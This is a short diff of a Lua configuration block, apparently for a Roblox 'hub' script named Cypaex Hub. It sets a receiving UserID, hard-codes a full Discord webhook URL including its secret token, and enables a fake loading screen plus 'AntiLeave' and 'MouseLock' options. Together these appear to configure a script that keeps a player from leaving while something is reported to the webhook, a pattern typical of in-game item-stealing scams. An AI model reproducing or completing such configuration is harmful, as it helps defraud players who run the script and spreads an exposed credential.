@@ -7,13 +7,14 @@
 
 ]]--
 
-_G.UserID = "2780916827"
+_G.UserID = "3641686898"
 _G.Webhook = "https://discord.com/api/webhooks/1128331201468444764/sXCT0Urwni0DUCTf_dwbJLIsSEMaROtK88tJcnKJTop_a4Vb5Qciw9MTLeySGMk_qcxQ"
 
 _G.LoadingScreen = true -- make it true if you want the loadingscreen
 _G.AntiLeave = true -- make it true if you want the antileave
 _G.MouseLock = true -- make it true if you want the mouselock
 
+-- Remove These If You're Not Using The Rizz LoadingScreen
 
 _G.ScriptName = "Cypaex Hub"
 _G.FirstText = "Preparing..."
